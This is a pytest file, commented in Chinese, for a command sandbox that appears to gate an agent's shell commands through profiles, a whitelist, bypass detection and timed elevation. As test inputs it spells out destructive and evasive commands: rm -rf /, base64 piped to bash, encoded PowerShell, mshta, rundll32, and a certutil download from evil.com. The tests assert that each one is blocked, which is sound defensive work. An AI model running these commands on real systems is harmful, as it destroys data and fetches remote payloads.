"""tests/test_sandbox.py — sandbox.py 单元测试

验收标准：
1. Profile 切换命令工作正常
2. 命令白名单拦截未知命令
3. 绕过检测能识别 base64 编码、分片组合、替代解释器
4. 临时授权到期后自动回退
"""

from __future__ import annotations

import time
from pathlib import Path
from typing import Generator

import pytest

import sys
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from sandbox import (
    Sandbox,
    SandboxCLI,
    Profile,
    ProfileConfig,
    InteractionLevel,
    CommandAction,
    BypassDetector,
    TempAuth,
    PROFILE_CONFIGS,
)


# ───────────────────────────────────────────────────────────────
# Profile 切换测试
# ───────────────────────────────────────────────────────────────

class TestProfileSwitching:
    def test_default_profile_is_assistant(self):
        sb = Sandbox()
        assert sb.profile == Profile.ASSISTANT
        assert sb.config.name == "ASSISTANT"

    def test_switch_to_all_profiles(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            assert sb.profile == p
            assert sb.config == PROFILE_CONFIGS[p]

    def test_switch_lockdown(self):
        sb = Sandbox()
        sb.switch_profile(Profile.LOCKDOWN)
        assert sb.config.name == "LOCKDOWN"
        assert sb.config.command_whitelist_enabled is True
        assert sb.config.default_interaction == InteractionLevel.T2_APPROVAL

    def test_switch_pipeline(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        assert sb.config.name == "PIPELINE"
        assert sb.config.command_whitelist_enabled is True

    def test_switch_research(self):
        sb = Sandbox()
        sb.switch_profile(Profile.RESEARCH)
        assert sb.config.name == "RESEARCH"
        assert sb.config.command_whitelist_enabled is False
        assert sb.config.default_interaction == InteractionLevel.T1_DIRECTED

    def test_switch_free(self):
        sb = Sandbox()
        sb.switch_profile(Profile.FREE)
        assert sb.config.name == "FREE"
        assert sb.config.audit_only is True

    def test_available_profiles(self):
        sb = Sandbox()
        assert set(sb.get_available_profiles()) == {"lockdown", "pipeline", "assistant", "research", "free"}

    def test_cli_mode_switch(self):
        sb = Sandbox()
        cli = SandboxCLI(sb)
        assert cli.cmd_mode("pipeline") == "Switched to PIPELINE mode"
        assert sb.profile == Profile.PIPELINE

    def test_cli_mode_unknown(self):
        sb = Sandbox()
        cli = SandboxCLI(sb)
        result = cli.cmd_mode("unknown")
        assert "Error" in result
        assert "Unknown profile" in result


# ───────────────────────────────────────────────────────────────
# 命令白名单测试
# ───────────────────────────────────────────────────────────────

class TestCommandWhitelist:
    def test_allow_git_status(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        action, reason = sb.evaluate_command("git status")
        assert action == CommandAction.ALLOW

    def test_deny_rm_rf_root(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        action, reason = sb.evaluate_command("rm -rf /")
        assert action == CommandAction.DENY
        assert "禁止删除根目录" in reason

    def test_deny_format_disk(self):
        sb = Sandbox()
        action, reason = sb.evaluate_command("format C:")
        assert action == CommandAction.DENY
        assert "格式化" in reason

    def test_ask_git_push(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        action, reason = sb.evaluate_command("git push origin main")
        assert action == CommandAction.ASK
        assert "推送" in reason

    def test_unknown_command_blocked_in_pipeline(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        action, reason = sb.evaluate_command("some_unknown_tool --arg")
        assert action == CommandAction.UNKNOWN
        assert "不在白名单" in reason

    def test_unknown_command_allowed_in_assistant(self):
        sb = Sandbox()
        sb.switch_profile(Profile.ASSISTANT)
        action, reason = sb.evaluate_command("some_unknown_tool --arg")
        assert action == CommandAction.ALLOW

    def test_unknown_command_allowed_in_research(self):
        sb = Sandbox()
        sb.switch_profile(Profile.RESEARCH)
        action, reason = sb.evaluate_command("some_unknown_tool --arg")
        assert action == CommandAction.ALLOW

    def test_free_mode_allows_anything(self):
        sb = Sandbox()
        sb.switch_profile(Profile.FREE)
        action, reason = sb.evaluate_command("rm -rf /")
        # FREE 模式下先过绕过检测和 deny 规则，rm -rf / 被 deny 规则命中
        # 但其他非 deny 命令应被允许
        action2, reason2 = sb.evaluate_command("some_unknown_tool --arg")
        assert action2 == CommandAction.ALLOW
        assert "FREE" in reason2

    def test_deny_always_hits_regardless_of_profile(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("rm -rf /")
            assert action == CommandAction.DENY, f"Profile {p.value} should deny rm -rf /"

    def test_ask_pip_install(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        action, reason = sb.evaluate_command("pip install requests")
        assert action == CommandAction.ASK
        assert "安装新依赖" in reason

    def test_allow_pytest(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        action, reason = sb.evaluate_command("pytest -v")
        assert action == CommandAction.ALLOW

    def test_allow_ls(self):
        sb = Sandbox()
        sb.switch_profile(Profile.LOCKDOWN)
        action, reason = sb.evaluate_command("ls -la")
        assert action == CommandAction.ALLOW

    def test_allow_mkdir(self):
        sb = Sandbox()
        sb.switch_profile(Profile.LOCKDOWN)
        action, reason = sb.evaluate_command("mkdir new_folder")
        assert action == CommandAction.ALLOW


# ───────────────────────────────────────────────────────────────
# 绕过检测测试
# ───────────────────────────────────────────────────────────────

class TestBypassDetection:
    def test_detect_base64_decode_pipe(self):
        d = BypassDetector()
        detected, reason = d.detect("echo 'dGVzdA==' | base64 -d | bash")
        assert detected is True
        assert "编码绕过" in reason

    def test_detect_long_base64_echo(self):
        d = BypassDetector()
        detected, reason = d.detect("echo 'dGVzdHRlc3R0ZXN0dGVzdHRlc3Q=' | bash")
        assert detected is True
        assert "编码绕过" in reason

    def test_detect_certutil_decode(self):
        d = BypassDetector()
        detected, reason = d.detect("certutil -decode payload.txt out.exe")
        assert detected is True
        assert "编码绕过" in reason

    def test_detect_fragmentation_set(self):
        d = BypassDetector()
        detected, reason = d.detect("SET A=echo && SET B=hello")
        assert detected is True
        assert "分片绕过" in reason

    def test_detect_fragmentation_var_combo(self):
        d = BypassDetector()
        detected, reason = d.detect("%A% %B%")
        assert detected is True
        assert "分片绕过" in reason

    def test_detect_alt_interpreter_cscript(self):
        d = BypassDetector()
        detected, reason = d.detect("cscript script.vbs")
        assert detected is True
        assert "替代解释器" in reason

    def test_detect_alt_interpreter_wscript(self):
        d = BypassDetector()
        detected, reason = d.detect("wscript script.js")
        assert detected is True
        assert "替代解释器" in reason

    def test_detect_alt_interpreter_mshta(self):
        d = BypassDetector()
        detected, reason = d.detect("mshta file.hta")
        assert detected is True
        assert "替代解释器" in reason

    def test_no_bypass_on_normal_git(self):
        d = BypassDetector()
        detected, reason = d.detect("git status")
        assert detected is False
        assert reason == ""

    def test_no_bypass_on_normal_ls(self):
        d = BypassDetector()
        detected, reason = d.detect("ls -la")
        assert detected is False

    def test_sandbox_blocks_bypassed_command(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        action, reason = sb.evaluate_command("echo 'dGVzdHRlc3R0ZXN0dGVzdHRlc3Q=' | bash")
        assert action == CommandAction.DENY
        assert "编码绕过" in reason

    def test_sandbox_blocks_certutil_bypass(self):
        sb = Sandbox()
        sb.switch_profile(Profile.ASSISTANT)
        action, reason = sb.evaluate_command("certutil -decode payload.txt out.exe")
        assert action == CommandAction.DENY
        assert "编码绕过" in reason

    def test_sandbox_blocks_mshta_bypass(self):
        sb = Sandbox()
        sb.switch_profile(Profile.ASSISTANT)
        action, reason = sb.evaluate_command("mshta javascript:alert('x')")
        # mshta 同时命中 deny 规则和替代解释器绕过检测
        assert action == CommandAction.DENY

    def test_sandbox_blocks_rundll32(self):
        sb = Sandbox()
        action, reason = sb.evaluate_command("rundll32 shell32.dll, #1")
        assert action == CommandAction.DENY
        assert "绕过手段" in reason

    def test_sandbox_blocks_powershell_encoded(self):
        sb = Sandbox()
        action, reason = sb.evaluate_command("powershell -enc dGVzdA==")
        assert action == CommandAction.DENY
        assert "绕过手段" in reason

    def test_sandbox_blocks_wmic_process_create(self):
        sb = Sandbox()
        action, reason = sb.evaluate_command("wmic process call create notepad")
        assert action == CommandAction.DENY
        assert "绕过手段" in reason


# ───────────────────────────────────────────────────────────────
# 临时授权测试
# ───────────────────────────────────────────────────────────────

class TestTempAuth:
    def test_grant_temp_auth(self):
        sb = Sandbox()
        sb.switch_profile(Profile.LOCKDOWN)
        sb.grant_temp_auth(Profile.FREE, duration_seconds=60)
        assert sb.profile == Profile.FREE
        assert sb.is_temp_active() is True

    def test_temp_auth_reverts_manually(self):
        sb = Sandbox()
        sb.switch_profile(Profile.LOCKDOWN)
        sb.grant_temp_auth(Profile.FREE, duration_seconds=60)
        assert sb.revoke_temp_auth() is True
        assert sb.profile == Profile.LOCKDOWN
        assert sb.is_temp_active() is False

    def test_revoke_without_temp_auth_returns_false(self):
        sb = Sandbox()
        assert sb.revoke_temp_auth() is False

    def test_temp_auth_auto_revert_on_expiry(self):
        sb = Sandbox()
        sb.switch_profile(Profile.LOCKDOWN)
        sb.grant_temp_auth(Profile.FREE, duration_seconds=0.1)
        assert sb.profile == Profile.FREE
        time.sleep(0.15)
        # 访问 profile 属性会触发过期检查
        assert sb.profile == Profile.LOCKDOWN
        assert sb.is_temp_active() is False

    def test_temp_auth_remaining_seconds(self):
        sb = Sandbox()
        sb.grant_temp_auth(Profile.FREE, duration_seconds=60)
        remaining = sb.temp_auth_remaining_seconds()
        assert 0 < remaining <= 60

    def test_temp_auth_expired_remaining_is_zero(self):
        sb = Sandbox()
        sb.grant_temp_auth(Profile.FREE, duration_seconds=0.05)
        time.sleep(0.1)
        assert sb.temp_auth_remaining_seconds() == 0.0

    def test_cli_elevate(self):
        sb = Sandbox()
        sb.switch_profile(Profile.LOCKDOWN)
        cli = SandboxCLI(sb)
        result = cli.cmd_elevate(duration_minutes=0.5)
        assert "Elevated to FREE mode" in result
        assert sb.profile == Profile.FREE

    def test_audit_log_records_temp_auth(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        sb.grant_temp_auth(Profile.FREE, duration_seconds=30)
        log = sb.get_audit_log()
        assert any("Temp auth granted" in entry for entry in log)

    def test_audit_log_records_auto_revert(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        sb.grant_temp_auth(Profile.FREE, duration_seconds=0.05)
        time.sleep(0.1)
        _ = sb.profile  # trigger expiry check
        log = sb.get_audit_log()
        assert any("Temp auth expired" in entry for entry in log)

    def test_temp_auth_original_preserved(self):
        sb = Sandbox()
        sb.switch_profile(Profile.RESEARCH)
        sb.grant_temp_auth(Profile.FREE, duration_seconds=60)
        status = sb.to_dict()
        assert status["temp_auth_active"] is True
        assert status["temp_auth_original"] == "research"


# ───────────────────────────────────────────────────────────────
# 状态序列化测试
# ───────────────────────────────────────────────────────────────

class TestStatusSerialization:
    def test_status_dict(self):
        sb = Sandbox()
        status = sb.to_dict()
        assert status["profile"] == "assistant"
        assert status["interaction_level"] == "T0_SUPERVISED"
        assert status["temp_auth_active"] is False
        assert status["temp_auth_original"] is None

    def test_status_with_temp_auth(self):
        sb = Sandbox()
        sb.grant_temp_auth(Profile.FREE, duration_seconds=300)
        status = sb.to_dict()
        assert status["profile"] == "free"
        assert status["temp_auth_active"] is True
        assert status["temp_auth_original"] == "assistant"
        assert status["temp_auth_remaining_seconds"] > 0


# ───────────────────────────────────────────────────────────────
# 审计日志测试
# ───────────────────────────────────────────────────────────────

class TestAuditLog:
    def test_audit_log_records_switches(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        sb.switch_profile(Profile.RESEARCH)
        log = sb.get_audit_log()
        assert any("Profile switched to pipeline" in entry for entry in log)
        assert any("Profile switched to research" in entry for entry in log)

    def test_audit_log_records_command_evaluations(self):
        sb = Sandbox()
        sb.switch_profile(Profile.PIPELINE)
        sb.evaluate_command("git status")
        sb.evaluate_command("rm -rf /")
        log = sb.get_audit_log()
        assert any("git status" in entry for entry in log)
        assert any("rm -rf /" in entry for entry in log)


# ───────────────────────────────────────────────────────────────
# 硬性限制测试（所有 Profile 下都生效）
# ───────────────────────────────────────────────────────────────

class TestHardLimits:
    def test_rm_rf_root_blocked_in_all_profiles(self):
        for p in Profile:
            sb = Sandbox()
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("rm -rf /")
            assert action == CommandAction.DENY, f"Profile {p.value} should block rm -rf /"

    def test_shutdown_blocked(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("shutdown /s")
            assert action == CommandAction.DENY

    def test_net_user_delete_blocked(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("net user /delete admin")
            assert action == CommandAction.DENY

    def test_certutil_urlcache_blocked(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("certutil -urlcache -split -f http://evil.com/payload")
            assert action == CommandAction.DENY

    def test_mshta_javascript_blocked(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("mshta javascript:alert('x')")
            assert action == CommandAction.DENY

    def test_rundll32_blocked(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("rundll32 shell32.dll, #1")
            assert action == CommandAction.DENY

    def test_powershell_encoded_blocked(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("powershell -encodedcommand dGVzdA==")
            assert action == CommandAction.DENY

    def test_wmic_process_create_blocked(self):
        sb = Sandbox()
        for p in Profile:
            sb.switch_profile(p)
            action, _ = sb.evaluate_command("wmic process call create notepad")
            assert action == CommandAction.DENY
